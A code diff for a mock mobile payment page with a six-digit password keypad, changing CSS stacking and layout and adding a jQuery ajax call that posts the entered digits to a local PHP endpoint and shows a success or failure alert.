@@ -13,6 +13,7 @@
     <style type="text/css">
     body{
         font-family: Microsoft YaHei;
+        background-color: #fff;
     }
         .clearfix:after {
        clear: both;
@@ -38,7 +39,7 @@
     box-sizing: content-box;
     -webkit-user-select: initial;
     outline: 'none';
-    z-index: 999;
+    z-index: 9999;
     opacity:0;
     filter:alpha(opacity=0);
   }
@@ -101,8 +102,14 @@
     margin-left:-150px;
     bottom:90px;
 }
-.dispoint{
-    pointer-events: none;
+.content{
+    z-index:1000;
+    height: 340px;
+    position: absolute;
+    bottom: 10px;
+    width: 100%;
+  
+
 }
 .heading{
     text-align: center;
@@ -116,6 +123,7 @@
     line-height: 40px;
     font-size: 13px;
     font-weight: 600;
+    z-index:999;
 }
 .pay{
     text-align: center;
@@ -127,6 +135,7 @@
     line-height: 20px;
     font-size: 10px;
     font-weight: 600;
+     z-index:999;
 }
 .money{
     text-align: center;
@@ -138,6 +147,7 @@
     line-height: 20px;
     font-size: 20px;
     color:#46D0FB;
+     z-index:999;
 
 }
 .u-close{
@@ -147,10 +157,15 @@
 .tip{
     margin-left: 24px;
 }
+.dispoint{
+ pointer-events: none;
+}
+
 </style>
 
 </head>
 <body>
+    <div id=loading-mask></div>
     <div class="header">
         <div class="navbar-left">
            <a href="index.html"><i class="fa fa-angle-left back"></i></a>
@@ -158,7 +173,8 @@
         <h1>支付</h1>
     </div>
         <div>
-            <input id="text1" type="number" maxlength="6" class="form-control" style="margin-top:60px;">
+            <input id="text1" type="number" class="form-control" style="margin-top:60px;">
+             <div class="msg"></div>
         </div>
 
     <div class="content">
@@ -171,7 +187,8 @@
          </div>
          <div class="pay">支付</div>
          <div class="money">88.8元</div>
-        <div id="payPassword_container" class="alieditContainer clearfix" data-busy="0">
+    </div>
+     <div id="payPassword_container" class="alieditContainer clearfix" data-busy="0">
             <div class="i-block" data-error="i_error">
                 <div class="i-block six-password">
                     <input class="i-text sixDigitPassword" id="payPassword_rsainput" type="password" autocomplete="off" required="required" value="" name="payPassword_rsainput" data-role="sixDigitPassword" tabindex="" maxlength="6" minlength="6" aria-required="true">
@@ -187,7 +204,6 @@
                 </div>
             </div>
         </div>
-    </div>
 
   
     <script type="text/javascript" src="static/js/keyboard.js"></script>
@@ -201,20 +217,40 @@
     var Array=$('b');
    Key=function(){
         var length=$('#text1').val().length;
-        // if(length==7)
-        // $('td').addClass('dispoint');
-        // console.log(length);
+        var paykey=$('#text1').val();
+        if(length==6){
+            $('td').addClass('dispoint');
+             $.ajax({    
+                url:'keycomfirm.php',// 跳转到 action    
+                data:{    
+                         key : paykey  
+                },    
+                type:'post',    
+                cache:false,    
+                dataType:'json',    
+                success:function(data) {     
+                        alert("支付成功！");
+                        window.location.reload();        
+                 },    
+                 error : function() {    
+                      alert("ajax失败异常！");  
+                       window.location.reload();     
+                 }    
+            });  
+        }
+        
+        
          Array.css("visibility","hidden");
             for(var i=0;i<length;i++)
            {
             $(Array[i]).css("visibility","visible");
            }
-        t=window.setTimeout(Key,500);
+        window.setTimeout(Key,500);
        }
       $(document).ready(function() {
         Key();
     });
-
+     
 
 
     </script>
